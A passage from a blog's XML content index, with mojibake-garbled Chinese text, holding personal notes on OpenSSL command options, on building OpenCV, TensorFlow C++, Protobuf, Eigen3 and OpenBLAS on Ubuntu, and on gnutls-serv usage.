å¾…å¤„ç†X509è¯ä¹¦æ–‡ä»¶<span class="token number">6.4</span><span class="token punctuation">)</span> -out arg       å¾…è¾“å‡ºX509è¯ä¹¦æ–‡ä»¶<span class="token number">6.5</span><span class="token punctuation">)</span> -req            è¡¨æ˜è¾“å…¥æ–‡ä»¶æ˜¯ä¸€ä¸ª<span class="token string">"è¯·æ±‚ç­¾å‘è¯ä¹¦æ–‡ä»¶(CSR)"</span>ï¼Œç­‰å¾…è¿›è¡Œç­¾å‘ <span class="token number">6.6</span><span class="token punctuation">)</span> -days arg       è¡¨æ˜å°†è¦ç­¾å‘çš„è¯ä¹¦çš„æœ‰æ•ˆæ—¶é—´ <span class="token number">6.7</span><span class="token punctuation">)</span> -CA arg æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„æ ¹CAè¯ä¹¦ <span class="token number">6.8</span><span class="token punctuation">)</span> -CAform arg     æ ¹CAè¯ä¹¦æ ¼å¼<span class="token punctuation">(</span>é»˜è®¤æ˜¯PEM<span class="token punctuation">)</span> <span class="token number">6.9</span><span class="token punctuation">)</span> -CAkey arg      æŒ‡å®šç”¨äºç­¾å‘è¯·æ±‚è¯ä¹¦çš„CAç§é’¥è¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœè¿™ä¸ªoptionæ²¡æœ‰å‚æ•°è¾“å…¥ï¼Œé‚£ä¹ˆç¼ºçœè®¤ä¸ºç§æœ‰å¯†é’¥åœ¨CAè¯ä¹¦æ–‡ä»¶é‡Œæœ‰<span class="token number">6.10</span><span class="token punctuation">)</span> -CAkeyform arg  æŒ‡å®šæ ¹CAç§é’¥è¯ä¹¦æ–‡ä»¶æ ¼å¼<span class="token punctuation">(</span>é»˜è®¤ä¸ºPEMæ ¼å¼<span class="token punctuation">)</span><span class="token number">6.11</span><span class="token punctuation">)</span> -CAserial arg   æŒ‡å®šåºåˆ—å·æ–‡ä»¶<span class="token punctuation">(</span>serial number <span class="token function">file</span><span class="token punctuation">)</span><span class="token number">6.12</span><span class="token punctuation">)</span> -CAcreateserial å¦‚æœåºåˆ—å·æ–‡ä»¶<span class="token punctuation">(</span>serial number <span class="token function">file</span><span class="token punctuation">)</span>æ²¡æœ‰æŒ‡å®šï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºå®ƒ     </code></pre>              </div>            </details><h3 id="7-dhparam">7 dhparam</h3><p>openssl dhparamç”¨äºç”Ÿæˆå’Œç®¡ç†dhæ–‡ä»¶ã€‚dh(Diffie-Hellman)æ˜¯è‘—åçš„å¯†é’¥äº¤æ¢åè®®ï¼Œæˆ–ç§°ä¸ºå¯†é’¥åå•†åè®®ï¼Œå®ƒå¯ä»¥ä¿è¯é€šä¿¡åŒæ–¹å®‰å…¨åœ°äº¤æ¢å¯†é’¥ã€‚ä½†æ³¨æ„ï¼Œå®ƒä¸æ˜¯åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥ä¸æä¾›åŠ å¯†åŠŸèƒ½ï¼Œä»…ä»…åªæ˜¯ä¿æŠ¤å¯†é’¥äº¤æ¢çš„è¿‡ç¨‹ã€‚åœ¨openvpnä¸­å°±ä½¿ç”¨äº†è¯¥äº¤æ¢åè®®</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">openssl dhparam <span class="token punctuation">[</span>-in filename<span class="token punctuation">]</span> <span class="token punctuation">[</span>-out filename<span class="token punctuation">]</span> <span class="token punctuation">[</span>-dsaparam<span class="token punctuation">]</span> <span class="token punctuation">[</span>-noout<span class="token punctuation">]</span> <span class="token punctuation">[</span>-text<span class="token punctuation">]</span> <span class="token punctuation">[</span>-rand file<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>numbits<span class="token punctuation">]</span>é€‰é¡¹è¯´æ˜ï¼š-in filenameï¼šä»filenameæ–‡ä»¶ä¸­è¯»å–å¯†é’¥äº¤æ¢åè®®å‚æ•°ã€‚-out filenameï¼šè¾“å‡ºå¯†é’¥äº¤æ¢åè®®å‚æ•°åˆ°filenameæ–‡ä»¶ã€‚-dsaparamï¼šæŒ‡å®šæ­¤é€‰é¡¹å°†ä½¿ç”¨dsaäº¤æ¢åè®®æ›¿ä»£dhäº¤æ¢åè®®ã€‚è™½ç„¶ç”Ÿæˆé€Ÿåº¦æ›´å¿«ï¼Œä½†æ›´ä¸å®‰å…¨ã€‚-nooutï¼šç¦æ­¢è¾“å‡ºä»»ä½•ä¿¡æ¯ã€‚-textï¼šä»¥æ–‡æœ¬æ ¼å¼è¾“å‡ºdhåè®®ã€‚-randï¼šæŒ‡å®šéšæœºæ•°ç§å­æ–‡ä»¶ã€‚numbitsï¼šæŒ‡å®šç”Ÿæˆçš„é•¿åº¦ã€‚</code></pre>              </div>            </details><h1>ä½¿ç”¨</h1><h2 id="å®¢æˆ·ç«¯">å®¢æˆ·ç«¯</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">openssl s_client -key ./experiments/keystore/client.key -cert ./experiments/keystore/client.crt -CAfile ./experiments/keystore/demoCA/cacert.pem </code></pre></div><h2 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">openssl s_server -key ./experiments/keystore/server.key -cert ./experiments/keystore/server.crt -CAfile ./experiments/keystore/demoCA/cacert.pem -accept <span class="token number">4433</span> -HTTP</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenCV Tensorflow C++API   Protobuf Eigen3 ç¼–è¯‘è¿‡ç¨‹</title>
      <link href="/posts/56ff1cb1/"/>
      <url>/posts/56ff1cb1/</url>
      
        <content type="html"><![CDATA[<h1>OpenCV Tensorflow C++API   Protobuf eigen3 ç¼–è¯‘è¿‡ç¨‹</h1><blockquote><p>@auther by sizaif</p><p>2021-08-10  14:22:25</p></blockquote><p>[TOC]</p><h2 id="OpenCV">OpenCV</h2><div class="story post-story"><p>é¦–å…ˆå®‰è£…OpenCVçš„ä¾èµ–æ–‡ä»¶ï¼Œåœ¨ç»ˆç«¯è¿è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> cmake <span class="token function">git</span> libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev<span class="token comment">#  if errorE: unable to locate libjasper-dev</span><span class="token function">sudo</span> add-apt-repository <span class="token string">"deb http://security.ubuntu.com/ubuntu xenial-security main"</span><span class="token comment"># or vim sources.list  add  "deb http://security.ubuntu.com/ubuntu xenial-security main" and update </span><span class="token function">vim</span> /etc/apt/sources.list<span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libjasper1 libjasper-dev</code></pre>              </div>            </details><p><strong>Install compiler and build tools</strong></p><ul><li><p>To compile OpenCV you will need a C++ compiler. Usually it is G++/GCC or Clang/LLVM:</p><ul><li><p>Install GCCâ€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y g++</code></pre></li><li><p>â€¦ or Clang:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y clang</code></pre></li></ul></li><li><p>OpenCV uses CMake build configuration tool:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y cmake</code></pre></li><li><p>CMake can generate scripts for different build systems, e.g. make,ninja:</p><ul><li><p>Install Makeâ€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">make</span></code></pre></li><li><p>â€¦ or Ninja:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y ninja-build</code></pre></li></ul></li><li><p>Install tool for getting and unpacking sources:</p><ul><li><p>wget and unzip â€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">wget</span> <span class="token function">unzip</span></code></pre></li><li><p>â€¦ or git :</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y <span class="token function">git</span></code></pre></li></ul></li></ul><p><strong>Download sources</strong></p><p>There are two methods of getting OpenCV sources:</p><ul><li><p>Download snapshot of repository using web browser or any download tool (~80-90Mb) and unpack itâ€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -O opencv.zip https://github.com/opencv/opencv/archive/master.zipunzip opencv.zipmv opencv-master opencv</code></pre></li><li><p>â€¦ or clone repository to local machine using git to get full change history (&gt;470Mb):</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/opencv/opencv.gitgit -C opencv checkout master</code></pre></li></ul><blockquote><p>Note</p><p>Snapshots of other branches, releases or commits can be found on the <a href="https://github.com/opencv/opencv">GitHub</a> and the <a href="https://opencv.org/releases.html">official download page</a>.</p></blockquote><p><strong>Configure and build</strong></p><ul><li><p>Create build directory:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p build <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> build</code></pre></li><li><p>Configure - generate build scripts for the preferred build system:</p><ul><li><p>For makeâ€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#è‡ªå®šä¹‰è·¯å¾„å®‰è£…OpenCV åˆ° /usr/local/opencv ä¸­cmake  -D CMAKE_INSTALL_PREFIX=/usr/local/opencv ../opencv </span></code></pre></li><li><p>â€¦ or for ninja :</p><pre class="language-bash" data-language="bash"><code class="language-bash">cmake -GNinja <span class="token punctuation">..</span>/opencv</code></pre></li></ul></li><li><p>Build - run actual compilation process:</p><ul><li><p>Using make â€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> -j4</code></pre></li><li><p>â€¦ or ninja :</p><pre class="language-bash" data-language="bash"><code class="language-bash">ninja</code></pre></li></ul></li></ul><blockquote><p>Note</p><p><em>Configure</em> process can download some files from the internet to satisfy library dependencies, connection failures can cause some of modules or functionalities to be turned off or behave differently. Refer to the <a href="https://docs.opencv.org/master/d0/d3d/tutorial_general_install.html">OpenCV installation overview</a> and <a href="https://docs.opencv.org/master/db/d05/tutorial_config_reference.html">OpenCV configuration options reference</a> tutorials for details and full configuration options reference.</p><p>If you experience problems with the build process, try to clean or recreate the build directory. Changes in the configuration like disabling a dependency, modifying build scripts or switching sources to another branch are not handled very well and can result in broken workspace.</p><p><em>Make</em> can run multiple compilation processes in parallel, <code>-j&lt;NUM&gt;</code> option means â€œrun <NUM> jobs simultaneouslyâ€. <em>Ninja</em> will automatically detect number of available processor cores and does not need <code>-j</code> option.</p></blockquote><p><strong>Check build results</strong></p><p>After successful build you will find libraries in the <code>build/lib</code> directory and executables (test, samples, apps) in the <code>build/bin</code> directory:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> binls lib</code></pre><p>CMake package files will be located in the build root:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> OpenCVConfig*.cmakels OpenCVModules.cmake</code></pre><p><strong>Install</strong></p><blockquote><p>Warning</p><p>The installation process only copies files to predefined locations and does minor patching. Installing using this method does not integrate opencv into the system package registry and thus, for example, opencv can not be uninstalled automatically. We do not recommend system-wide installation to regular users due to possible conflicts with system packages.</p></blockquote><p>By default OpenCV will be installed to the <code>/usr/local</code> directory, all files will be copied to following locations:</p><ul><li><code>/usr/local/bin</code> - executable files</li><li><code>/usr/local/lib</code> - libraries (.so)</li><li><code>/usr/local/cmake/opencv4</code> - cmake package</li><li><code>/usr/local/include/opencv4</code> - headers</li><li><code>/usr/local/share/opencv4</code> - other files (e.g. trained cascades in XML format)</li></ul><p>Since <code>/usr/local</code> is owned by the root user, the installation should be performed with elevated privileges (<code>sudo</code>):</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>or</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ninja <span class="token function">install</span></code></pre><p>Installation root directory can be changed with <code>CMAKE_INSTALL_PREFIX</code> configuration parameter, e.g. <code>-DCMAKE_INSTALL_PREFIX=$HOME/.local</code> to install to current userâ€™s local directory. Installation layout can be changed with <code>OPENCV_*_INSTALL_PATH</code> parameters. See <a href="https://docs.opencv.org/master/db/d05/tutorial_config_reference.html">OpenCV configuration options reference</a> for details.</p><hr><p>Generated on Tue Apr 20 2021 02:31:39 for OpenCV by  <a href="http://www.doxygen.org/index.html"> <img src="https://docs.opencv.org/master/doxygen.png" class="lazyload" data-srcset="https://docs.opencv.org/master/doxygen.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="doxygen"> </a>1.8.13</p></div><h2 id="Tensorflow">Tensorflow</h2><div class="story post-story"><h3 id="bazel">bazel</h3><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Bazel needs a C++ compiler and unzip / zip in order to work:</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> g++ <span class="token function">unzip</span> <span class="token function">zip</span><span class="token comment"># Run the installer</span><span class="token function">chmod</span> +x bazel-<span class="token operator">&lt;</span>version<span class="token operator">></span>-installer-linux-x86_64.sh./bazel-<span class="token operator">&lt;</span>version<span class="token operator">></span>-installer-linux-x86_64.sh --user<span class="token comment"># Set up your environment</span><span class="token function">vim</span> ~/.bashrc<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:<span class="token environment constant">$HOME</span>/bin"</span><span class="token builtin class-name">source</span> ~/.bashrc</code></pre>              </div>            </details></div><h2 id="tensorflow-v2-4-0">tensorflow-v2.4.0</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å®‰è£…ä»¥ä¸‹æ„å»ºå·¥å…·ä»¥é…ç½®å¼€å‘ç¯å¢ƒã€‚</span><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-dev python3-pippip <span class="token function">install</span> numpy<span class="token comment"># å®‰è£… Bazel</span><span class="token function">git</span> clone https://github.com/tensorflow/tensorflow.git<span class="token builtin class-name">cd</span> tensorflow<span class="token function">git</span> checkout branch_name  <span class="token comment"># r2.2, r2.3, etc.</span>./configure<span class="token comment"># CUDA GPU</span>bazel build --config<span class="token operator">=</span>opt --config<span class="token operator">=</span>cuda //tensorflow:libtensorflow_cc.so<span class="token comment"># CPU</span>bazel build --config<span class="token operator">=</span>opt //tensorflow:libtensorflow_cc.so<span class="token comment"># ç¼–è¯‘å®Œæˆå,  å°†å¤´æ–‡ä»¶ ( bazel-bin/tensorflow å’Œ ä¸‹ **.so  å¤åˆ¶åˆ° /usr/local/include/tf/tensorflow å’Œ /usr/local/lib</span><span class="token function">mkdir</span> /usr/local/include/tf<span class="token function">cp</span> -r bazel-bin/tensorflow/* /usr/local/include/tf/tensorflow/<span class="token function">sudo</span> <span class="token function">cp</span> -r bazel-bin/tensorflow/*.so /usr/local/lib/</code></pre>              </div>            </details><h3 id="æµ‹è¯•">æµ‹è¯•</h3><p>CMakeLists.txt</p><details green><summary> CMakeLists.txt </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">cmake_minimum_required<span class="token punctuation">(</span>VERSION <span class="token number">2.8</span><span class="token punctuation">)</span><span class="token comment"># project Name &amp; Version</span>project<span class="token punctuation">(</span>STOtest<span class="token punctuation">)</span><span class="token comment"># find_package</span>find_package<span class="token punctuation">(</span>OpenCV REQUIRED<span class="token punctuation">)</span><span class="token comment"># set location </span><span class="token comment"># Openblas</span>set<span class="token punctuation">(</span>OpenBlas_DIR /usr/local/OpenBlas<span class="token punctuation">)</span><span class="token comment"># eigen</span>set<span class="token punctuation">(</span>Eigen_DIR /usr/local/include/eigen3<span class="token punctuation">)</span><span class="token comment"># tensorflow</span>set<span class="token punctuation">(</span>Tensorflow_INCLUDES            /usr/local/include/tf/            /usr/local/include/tf/tensorflow/            /usr/local/include/tf/tensorflow/third-party<span class="token punctuation">)</span>set<span class="token punctuation">(</span>Tensorflow_LIBS/usr/local/lib/libtensorflow_cc.so/usr/local/lib/libtensorflow_framework.so<span class="token punctuation">)</span><span class="token comment"># protobuf</span>set<span class="token punctuation">(</span>Protobuf_INCLUDES /usr/local/include/google<span class="token punctuation">)</span>set<span class="token punctuation">(</span>Protobuf_LIBS /usr/local/bin/protoc<span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS: <span class="token string">"OpenBlas_DIR= <span class="token variable">$&#123;OpenBlas_DIR&#125;</span>"</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS <span class="token string">"OpenCV library status:"</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS <span class="token string">"    config=: <span class="token variable">$&#123;OpenCV_DIR&#125;</span>"</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS <span class="token string">"    version=: <span class="token variable">$&#123;OpenCV_VERSION&#125;</span>"</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS <span class="token string">"    libraries=: <span class="token variable">$&#123;OpenCV_LIBS&#125;</span>"</span><span class="token punctuation">)</span>message<span class="token punctuation">(</span>STATUS <span class="token string">"    include path=: <span class="token variable">$&#123;OpenCV_INCLUDE_DIRS&#125;</span>"</span><span class="token punctuation">)</span><span class="token comment"># include </span>include_directories<span class="token punctuation">(</span>    <span class="token variable">$&#123;Tensorflow_INCLUDES&#125;</span>    <span class="token variable">$&#123;Eigen_DIR&#125;</span>    <span class="token variable">$&#123;OpenBlas_DIR&#125;</span>    <span class="token variable">$&#123;Protobuf_INCLUDES&#125;</span><span class="token punctuation">)</span><span class="token comment"># src cpp</span>aux_source_directory<span class="token punctuation">(</span>./src DIR_SRCS<span class="token punctuation">)</span>add_executable<span class="token punctuation">(</span> main <span class="token builtin class-name">.</span><span class="token variable">$&#123;DIR_SRCS&#125;</span><span class="token punctuation">)</span><span class="token comment"># target</span>target_link_libraries<span class="token punctuation">(</span>main PRIVATE <span class="token variable">$&#123;OpenCV_LIBS&#125;</span> <span class="token variable">$&#123;Tensorflow_LIBS&#125;</span> <span class="token variable">$&#123;Protobuf_LIBS&#125;</span><span class="token punctuation">)</span></code></pre>              </div>            </details><details green><summary> code </summary>              <div class='content'>              <pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;#include &quot;opencv2&#x2F;highgui.hpp&quot;&#x2F;&#x2F;#include &quot;opencv2&#x2F;imgproc.hpp&quot;#include &lt;tensorflow&#x2F;core&#x2F;platform&#x2F;env.h&gt;#include &lt;tensorflow&#x2F;core&#x2F;public&#x2F;session.h&gt;#include &lt;iostream&gt;&#x2F;&#x2F;susing namespace cv;using namespace std;using namespace tensorflow;int main( )&#123;    cout &lt;&lt; &quot;hello tensorflow&quot; &lt;&lt;endl;       Session* session;    Status status &#x3D; NewSession(SessionOptions(), &amp;session);    if (!status.ok()) &#123;        cout &lt;&lt; status.ToString() &lt;&lt; endl;        cout &lt;&lt;&quot;Session not ok&quot; &lt;&lt; endl;        return 1;    &#125;    cout &lt;&lt; &quot;Session successfully created.&quot;&lt;&lt;endl;    return 0;&#125;</code></pre>              </div>            </details></div><h2 id="Protobuf">Protobuf</h2><div class="story post-story"><p>1ï¼‰ä¸ŠGithubä¸‹è½½protocbufæºç åŒ…</p><pre class="language-bash" data-language="bash"><code class="language-bash">https://github.com/protocolbuffers/protobuf/releases/tag/vX.X.X</code></pre><p>2ï¼‰å®‰è£…ä¾èµ–åŒ…</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> autoconf automake libtool <span class="token function">curl</span> <span class="token function">make</span> g++ <span class="token function">unzip</span></code></pre><p>3ï¼‰è¿›å…¥æºç ç›®å½•ï¼Œæ‰§è¡Œ./autogen.shç”Ÿæˆconfigureæ–‡ä»¶</p><p>4ï¼‰ä¾æ¬¡æ‰§è¡Œ</p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"> ./configure <span class="token function">make</span> <span class="token function">make</span> check <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span> <span class="token function">sudo</span> ldconfig <span class="token comment"># refresh shared library cache.</span>  <span class="token comment"># éªŒè¯ç‰ˆæœ¬</span>siz@ubuntu:~$ protoc --versionlibprotoc <span class="token number">3.9</span>.2siz@ubuntu:~$ <span class="token function">whereis</span> protocprotoc: /usr/local/bin/protoc</code></pre>              </div>            </details></div><h2 id="Eigen3">Eigen3</h2><div class="story post-story"><h3 id="ç®€å•å‘½ä»¤å®‰è£…">ç®€å•å‘½ä»¤å®‰è£…</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libeigen3-dev</code></pre><h3 id="æºç ç¼–è¯‘å®‰è£…">æºç ç¼–è¯‘å®‰è£…</h3><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">http://eigen.tuxfamily.org/index.php?title<span class="token operator">=</span>Main_Page<span class="token function">git</span> clone https://gitlab.com/libeigen/eigen.git<span class="token function">mkdir</span> build<span class="token builtin class-name">cd</span> buildcmake <span class="token punctuation">..</span><span class="token function">sudo</span> <span class="token function">make</span> instal<span class="token comment"># å®‰è£…æˆåŠŸå,å¤´æ–‡ä»¶è·¯å¾„åœ¨ /usr/local/include/eigen3/</span><span class="token comment"># CMakeLists.txt  ä¸­æ·»åŠ  eigen3 å¤´æ–‡ä»¶</span>include_directories<span class="token punctuation">(</span> <span class="token string">"/usr/include/eigen3"</span> <span class="token punctuation">)</span></code></pre>              </div>            </details></div><h2 id="OpenBlas">OpenBlas</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/xianyi/OpenBLAS.git<span class="token builtin class-name">cd</span> OpenBLAS<span class="token function">make</span><span class="token function">make</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span>/usr/local/Openblas <span class="token function">install</span></code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> OpenCV </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenCV </tag>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GnuTLS ä½¿ç”¨æ‰‹å†Œ</title>
      <link href="/posts/89554caf/"/>
      <url>/posts/89554caf/</url>
      
        <content type="html"><![CDATA[<h1>GnuTLS ä½¿ç”¨æ‰‹å†Œ</h1><blockquote><p>ğŸ˜„  @by sizaif</p><p>ğŸ“†  2021-05-17  16:23:57</p></blockquote><p>[TOC]</p><h1>å‘½ä»¤è¡Œè§£æ</h1><h2 id="gnutls-serv">gnutls-serv</h2><div class="story post-story"><p><a href="https://gnutls.org/manual/html_node/gnutls_002dserv-Invocation.html">https://gnutls.org/manual/html_node/gnutls_002dserv-Invocation.html</a></p><details green><summary> GnuTLS server </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">gnutls-serv - GnuTLS serverUsage:  gnutls-serv <span class="token punctuation">[</span> -<span class="token operator">&lt;</span>flag<span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">&lt;</span>val<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">|</span> --<span class="token operator">&lt;</span>name<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token operator">=</span><span class="token operator">|</span> <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span>val<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">..</span>.   -d, --debug<span class="token operator">=</span>num            Enable debugging                                - it must be <span class="token keyword">in</span> the range:                                  <span class="token number">0</span> to <span class="token number">9999</span>       --sni-hostname<span class="token operator">=</span>str     Server<span class="token string">'s hostname for server name extension       --sni-hostname-fatal   Send fatal alert on sni-hostname mismatch       --alpn=str             Specify ALPN protocol to be enabled by the server                                - may appear multiple times       --alpn-fatal           Send fatal alert on non-matching ALPN name       --noticket             Don'</span>t accept session tickets       --earlydata            Accept early data       --maxearlydata<span class="token operator">=</span>num     The maximum early data size to accept                                - it must be <span class="token keyword">in</span> the range:                                  greater than or equal to <span class="token number">1</span>       --nocookie             Don<span class="token string">'t require cookie on DTLS sessions   -g, --generate             Generate Diffie-Hellman parameters   -q, --quiet                Suppress some messages       --nodb                 Do not use a resumption database       --http                 Act as an HTTP server       --echo                 Act as an Echo server       --crlf                 Do not replace CRLF by LF in Echo server mode   -u, --udp                  Use DTLS (datagram TLS) over UDP       --mtu=num              Set MTU for datagram TLS                                - it must be in the range:                                  0 to 17000       --srtp-profiles=str    Offer SRTP profiles   -a, --disable-client-cert  Do not request a client certificate                                - prohibits the option '</span>require-client-cert<span class="token string">'   -r, --require-client-cert  Require a client certificate       --verify-client-cert   If a client certificate is sent then verify it.   -b, --heartbeat            Activate heartbeat support       --x509fmtder           Use DER format for certificates to read from       --priority=str         Priorities string       --dhparams=file        DH params file to use                                - file must pre-exist       --x509cafile=str       Certificate file or PKCS #11 URL to use       --x509crlfile=file     CRL file to use                                - file must pre-exist       --x509keyfile=str      X.509 key file or PKCS #11 URL to use                                - may appear multiple times       --x509certfile=str     X.509 Certificate file or PKCS #11 URL to use                                - may appear multiple times       --rawpkkeyfile=str     Private key file (PKCS #8 or PKCS #12) or PKCS #11 URL to use                                - may appear multiple times       --rawpkfile=str        Raw public-key file to use                                - requires the option '</span>rawpkkeyfile'                                - may appear multiple <span class="token builtin class-name">times</span>       --srppasswd<span class="token operator">=</span>file       SRP password <span class="token function">file</span> to use                                - <span class="token function">file</span> must pre-exist       --srppasswdconf<span class="token operator">=</span>file   SRP password configuration <span class="token function">file</span> to use                                - <span class="token function">file</span> must pre-exist       --pskpasswd<span class="token operator">=</span>file       PSK password <span class="token function">file</span> to use                                - <span class="token function">file</span> must pre-exist       --pskhint<span class="token operator">=</span>str          PSK identity hint to use       --ocsp-response<span class="token operator">=</span>str    The OCSP response to send to client                                - may appear multiple <span class="token builtin class-name">times</span>       --ignore-ocsp-response-errors  Ignore any errors when setting the OCSP response   -p, --port<span class="token operator">=</span>num             The port to connect to   -l, --list                 Print a list of the supported algorithms and modes       --provider<span class="token operator">=</span>file        Specify the PKCS <span class="token comment">#11 provider library</span>                                - <span class="token function">file</span> must pre-exist       --keymatexport<span class="token operator">=</span>str     Label used <span class="token keyword">for</span> exporting keying material       --keymatexportsize<span class="token operator">=</span>num Size of the exported keying material       --recordsize<span class="token operator">=</span>num       The maximum record size to advertise                                - it must be <span class="token keyword">in</span> the range:                                  <span class="token number">0</span> to <span class="token number">16384</span>       --httpdata<span class="token operator">=</span>file        The data used as HTTP response                                - <span class="token function">file</span> must pre-exist   -v, --version<span class="token punctuation">[</span><span class="token operator">=</span>arg<span class="token punctuation">]</span>        output version information and <span class="token builtin class-name">exit</span>   -h, --help                 display extended usage information and <span class="token builtin class-name">exit</span>   -<span class="token operator">!</span>, --more-help            extended usage information passed thru pagerOptions are specified by doubled hyphens and their name or by a singlehyphen and the flag character.Server program that listens to incoming TLS connections.</code></pre>              </div>            </details></div><h2 id="ä½¿ç”¨">ä½¿ç”¨</h2><div class="story post-story"><h3 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h3><p>Note that the server listens to port <code>5556</code> by default.</p><p>ä¾‹å­</p><pre class="language-bash" data-language="bash"><code class="language-bash">gnutls-serv --http --x509keyfile experiments/keystore/rsa2048_key.pem --x509certfile experiments/keystore/rsa2048_cert.pem --x509cafile experiments/keystore/rsa2048_cert.pem --pskpasswd experiments/keystore/keys.psk --priority NORMAL:+PSK:+SRP --mtu <span class="token number">1500</span> -p <span class="token number">30002</span>"</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> ç¬”è®° </category>
          
          <category> SSL </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
            <tag> ç¬”è®° </tag>
            
            <tag> GnuTLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
